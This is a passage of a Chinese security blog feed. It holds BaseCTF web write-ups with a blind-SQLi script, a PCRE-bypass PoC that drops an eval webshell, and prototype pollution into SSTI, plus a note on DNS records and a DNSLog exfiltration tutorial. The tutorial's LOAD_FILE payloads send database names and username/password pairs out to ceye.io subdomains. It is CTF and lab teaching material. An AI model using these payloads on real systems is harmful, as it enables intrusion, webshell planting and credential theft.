class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];  <br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);  <br>&#125;  <br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);  <br>&#125;  <br><span class="hljs-comment">//flag in ctf.flag  </span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;  <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>利用update和REGEXP进行时间盲注，可能会因为网络原因报错，多跑几次就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> time  <br>  <br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:47649&#x27;</span>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>strings = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;&#x27;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):  <br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> strings:  <br>            payload=<span class="hljs-string">&quot;UPDATE flag SET id = &#x27;fffffilm&#x27; WHERE data REGEXP &#x27;^Basectf&#x27; AND IF(data REGEXP &#x27;^&#123;&#125;&#x27;,sleep(1), 1)&quot;</span>.<span class="hljs-built_in">format</span>((flag+char))  <br>            params=&#123;  <br>                <span class="hljs-string">&quot;sql&quot;</span>:payload  <br>            &#125;  <br>            <span class="hljs-built_in">print</span>(payload)  <br>            time.sleep(<span class="hljs-number">0.05</span>)  <br>            start_time = time.time()  <br>            rs = requests.get(url,params=params)  <br>            end_time = time.time()  <br>            <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">1</span>:  <br>                flag += char  <br>                <span class="hljs-built_in">print</span>(flag)  <br>                <span class="hljs-keyword">break</span>  <br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(flag)&gt;<span class="hljs-number">44</span>:  <br>                <span class="hljs-built_in">print</span>(flag[:<span class="hljs-number">1</span>]+flag[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>].lower()+flag[<span class="hljs-number">4</span>:<span class="hljs-number">7</span>]+flag[<span class="hljs-number">7</span>:].lower())  <br>                exit()<br></code></pre></td></tr></table></figure><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><p>白盒审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);  <br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？  </span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];  <br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];  <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)  <br>&#123;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;  <br>  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);  <br>    &#125;  <br>  <br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];  <br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];  <br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();  <br>&#125;  <br><span class="hljs-keyword">else</span>  <br>&#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);  <br>&#125;  <br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~  </span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];  <br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="intval-函数的绕过"><a href="#intval-函数的绕过" class="headerlink" title="intval()函数的绕过"></a>intval()函数的绕过</h4><p>第一难其实是<code>e_m.p</code>这个参数怎么传, 但其实上面已经绕过了</p><p><code>intval（$value,$base）</code>当base为0时，会检测value的格式来决定使用的进制。传16进制满足第一个if，也就是：<code>e[m.p=0x1bf52</code></p><p>再下面又有一个ctype_alpha函数,<strong>ctype_alpha</strong> — 做纯字符检测。——如果在当前语言环境中 <code>text</code> 里的每个字符都是一个字母，那么就返回**<code>true</code><strong>，反之则返回</strong><code>false</code>**。</p><p>那用8进制好了，<code>e[m.p=0337522</code></p><h4 id="preg-match和stripos组合"><a href="#preg-match和stripos组合" class="headerlink" title="preg_match和stripos组合"></a>preg_match和stripos组合</h4><p>preg_match是正则表达式, stripos是返回字串在母串最后一次出现的位置</p><p>preg_match的绕过有人总结过,<a href="https://www.cnblogs.com/z2n3/p/17272754.html">preg_match绕过简单总结 - z2n3 - 博客园 (cnblogs.com)</a><br>大概只有这四种</p><p>而stripos函数则比较安全, 所以从preg_match下手</p><p>由于stripos()不接受数组作为参数, 所以只好使用preg_match的PCRE正则回溯次数限制绕过</p><p>原理:<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a><br>注意, 正则回溯不是一味的多传递字符, 而是在于回溯, 所以一定要回去看看这个漏洞原理</p><p>我最后的处理方式是<code>&quot;try&quot;:&quot;HACKE&quot; + &#39;l&#39; * 1000000 + &quot;HACKER&quot;,</code></p><h4 id="php内置对象处理"><a href="#php内置对象处理" class="headerlink" title="php内置对象处理"></a>php内置对象处理</h4><p>然后是这一段, 出现在这里的用意应该是保证不让这行语句报错就可以平稳过关了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];  <br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];  <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;  <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);  <br>&#125;  <br><span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();  <br></code></pre></td></tr></table></figure><p>首先<code>$b</code>要以<code>php</code>开头, 这是先决条件<br><code>$a</code>明显需要填一个php的内置对象, 它必须要有构造函数, 且构造函数要传入一个参数, 并且参数是以php开头的字符串, 而且由于有一个echo, 所以这个对象还需要一个<code>__toString()</code>函数</p><p>询问GPT后符合的对象是<strong>SplFileInfo</strong><br><img src="/images/Pasted%20image%2020240918180404.png"></p><p><code>$a</code>就是<strong>SplFileInfo</strong>, <code>$b</code>填一个php伪协议<code>php://filter/read=convert.base64-encode/resource=flag.txt</code>, <code>$c</code>是<code>__toString</code></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>发送一个shell参数生成木马<code>fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);</code><br>最后poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><br>brup_proxy = &#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&quot;127.0.0.1:9090&quot;</span>&#125; <span class="hljs-comment">#挂上burp的代理</span><br>parms = &#123;<br>    <span class="hljs-string">&quot;e[m.p&quot;</span>:<span class="hljs-string">&quot;0337522&quot;</span>,<br>    <br>    <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;SplFileInfo&quot;</span>,<br>    <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.txt&quot;</span>,<br>    <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;__toString&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;try&quot;</span>:<span class="hljs-string">&quot;HACKE&quot;</span> + <span class="hljs-string">&#x27;l&#x27;</span> * <span class="hljs-number">1000000</span> + <span class="hljs-string">&quot;HACKER&quot;</span>,<br>    <span class="hljs-string">&quot;shell&quot;</span>:<span class="hljs-string">&quot;fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval(<span class="hljs-subst">$_REQUEST</span>[1]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br>res = requests.<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;http://challenge.basectf.fun:43650&#x27;</span>, params=parms,data=data, allow_redirects=False,proxies=brup_proxy)<br><span class="hljs-keyword">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>然后就可以连上<code>http://challenge.basectf.fun:43650/xiao.php</code>这个木马了</p><h3 id="JinjaMark"><a href="#JinjaMark" class="headerlink" title="JinjaMark"></a>JinjaMark</h3><p><img src="/images/Pasted%20image%2020240920092626.png"></p><p>进入&#x2F;index 是SSSTI, 但是尝试后发现不能执行<br><img src="/images/Pasted%20image%2020240920092730.png"></p><p>进入<code>/flag</code>,<br><img src="/images/Pasted%20image%2020240920092829.png"><br>爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>brup_proxy = &#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&quot;127.0.0.1:9090&quot;</span>&#125;<br><span class="hljs-comment"># 目标URL</span><br>url = <span class="hljs-string">&quot;http://challenge.basectf.fun:29722/flag&quot;</span><br><br><br>data1 = &#123;<span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&#x27;1000&#x27;</span>&#125;<br>response = requests.post(url, data=data1,proxies=brup_proxy)<br>text = response.text<br><span class="hljs-built_in">print</span>(text)<br><span class="hljs-comment"># 遍历所有四位数字</span><br><span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>, <span class="hljs-number">10000</span>):<br>    <span class="hljs-comment"># 定义要发送的数据</span><br>    data = &#123;<span class="hljs-string">&quot;lucky_number&quot;</span>: number&#125;<br>    <br>    <span class="hljs-comment"># 发送POST请求</span><br>    response = requests.post(url, data=data,proxies=brup_proxy)<br>    <span class="hljs-keyword">if</span> response.text != text :<br>       <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>返回了一份源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/magic&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br></code></pre></td></tr></table></figure><p>发现merge方法,根据python原型链污染, 可以发送一个json数据, 覆盖掉全局变量<code>BLACKLIST_IN_index</code>的值<br><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIe0IqY5+u11D8DIrbD">浅谈Python原型链污染及利用方式 - 先知社区 (aliyun.com)</a><br>在函数或类方法中，我们经常会看到<code>__init__</code>初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，<code>__globals__</code> 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。</p><p>所以可以用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;BLACKLIST_IN_index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>完成污染</p><p>注意json数据格式的发送, 可以用python脚本, 也可以直接在burp里面加入, 但是注意不能换行<br>完成原型链污染后就是SSTI了, 使用fenjing</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%9C%89%E5%85%B3DNS%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/09/23/%E6%9C%89%E5%85%B3DNS%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>DNS记录，全称为域名系统记录（Domain Name System Record），是用于将域名和IP地址相互映射的一种数据记录。当你在浏览器中输入一个网站的域名时，DNS记录就负责将这个域名解析为对应的IP地址，以便你的设备能够找到并访问该网站所在的服务器。</p><p>DNS记录的主要类型包括：</p><ol><li><strong>A记录（Address Record）</strong>：将域名解析为IPv4地址。</li><li><strong>AAAA记录（IPv6 Address Record）</strong>：将域名解析为IPv6地址。</li><li><strong>CNAME记录（Canonical Name Record）</strong>：将域名解析为另一个域名，通常用于将多个域名指向同一个地址。</li><li><strong>MX记录（Mail Exchange Record）</strong>：用于指定邮件服务器，用于处理发往域名的电子邮件。</li><li><strong>TXT记录（Text Record）</strong>：用于存储文本信息，常用于电子邮件验证和SPF（Sender Policy Framework）记录。</li><li><strong>NS记录（Name Server Record）</strong>：指定哪些DNS服务器负责解析域名。</li><li><strong>SOA记录（Start of Authority Record）</strong>：包含域名服务器的权威信息，如管理员联系信息和刷新时间。</li></ol><p>DNS记录对于互联网的正常运作至关重要，它们使得用户可以通过易于记忆的域名来访问网站，而不需要记住复杂的IP地址。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-DNS%E5%A4%96%E5%B8%A6/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-DNS%E5%A4%96%E5%B8%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="DNSLog外带"><a href="#DNSLog外带" class="headerlink" title="DNSLog外带"></a><a href="https://www.cnblogs.com/hellobao/articles/17266933.html" title="发布于 2023-03-28 22:46">DNSLog外带</a></h1><h1 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h1><p>在进行盲注的时候，因为需要频繁发送访问请求，有的网站配置了waf就有可能让我们的注入受阻。所以用DNSlog外带可以减少请求并且直接回显数据。（非常好用）</p><p>DNS：(Domain Name System)域名系统，负责把域名转换成IP地址。</p><p>DNSlog：DNS的日志，DNS在域名解析的时候会留下域名和解析IP的记录。</p><p>DNSlog外带原理：DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p><p><strong>dnslog通常用在：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-keyword">SQL</span>盲注<br><span class="hljs-number">2.</span>无回显的XSS<br><span class="hljs-number">3.</span>无回显的命令执行<br><span class="hljs-number">5.</span>无回显的SSRF<br><span class="hljs-number">5.</span>Blind XXE<br></code></pre></td></tr></table></figure><p>三个常见的DNSLog平台：</p><ul><li><a href="http://ceye.io/">http://ceye.io</a></li><li><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li><li><a href="http://eyes.sh/dns/">http://eyes.sh/dns/</a></li></ul><h1 id="1、DNSLog回显原理"><a href="#1、DNSLog回显原理" class="headerlink" title="1、DNSLog回显原理"></a>1、DNSLog回显原理</h1><p>遇到无回显注入时，写脚本进行盲注，设置ip代理池解决ip封禁的问题。但是盲注效率很低，所以产生了DNSlog注入。</p><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。</p><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p><p>如图：<br><img src="/images/Pasted%20image%2020240515001106.png"></p><h1 id="2、DNSLOG回显测试"><a href="#2、DNSLOG回显测试" class="headerlink" title="2、DNSLOG回显测试"></a><strong>2、DNSLOG回显测试</strong></h1><p><strong>或者 <a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></strong></p><p><strong>注册<a href="http://ceye.io，给了一个二级域名：xxx.ceye.io。把注入信息放到二级域名那里，后台的日志会记录下来。">http://ceye.io，给了一个二级域名：xxx.ceye.io。把注入信息放到二级域名那里，后台的日志会记录下来。</a></strong><br><img src="/images/Pasted%20image%2020240515001131.png"></p><h1 id="3、SQL盲注"><a href="#3、SQL盲注" class="headerlink" title="3、SQL盲注"></a><strong>3、SQL盲注</strong></h1><p><strong><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a> 自动化脚本</strong></p><p>dnslog回显只能用于windows系统，原理就是’\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠</p><p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。</p><p>show variables like ‘%secure%’; 查看load_file()可以读取的磁盘</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。<br><img src="/images/Pasted%20image%2020240515001204.png"></p><p>select load_file(‘\\afanti.xxxx.ceye.io\aaa’);  其中afanti就是要注入的查询语句，查看平台，dnsLog被记录下来。<br><img src="/images/Pasted%20image%2020240515001217.png"></p><p>测试sql-labs第五关：</p><p>payload：’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p><p>sql语句：SELECT * FROM users WHERE id&#x3D;’1’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)</p><p>查看dnslog日志，发现security数据库被查询出来：</p><p><img src="/images/Pasted%20image%2020240515001250.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>)); <br><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,database(),<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>));\\意思是让LOAD_FILE去读每个文件，当然这么文件存不存在，我们并不在意 <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询当前库的第一个表 <br><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>));<br></code></pre></td></tr></table></figure><pre><code class="hljs">![](/images/Pasted%20image%2020240515001303.png)</code></pre><p><img src="/images/Pasted%20image%2020240515001326.png"></p><p>DNS请求被成功记录下来，由于test位置是可控的，所以可以将查询语句插入<br><img src="/images/Pasted%20image%2020240515001410.png"></p><p><img src="/images/Pasted%20image%2020240515001345.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询第当前库第一个表名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select LOAD_FILE(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>mysql.buvx2r.ceye.io\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br><span class="hljs-string">//查询users表第一个字段 使用hex编码避免出现特殊字符</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> LOAD_FILE(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> hex(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,password)) <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span 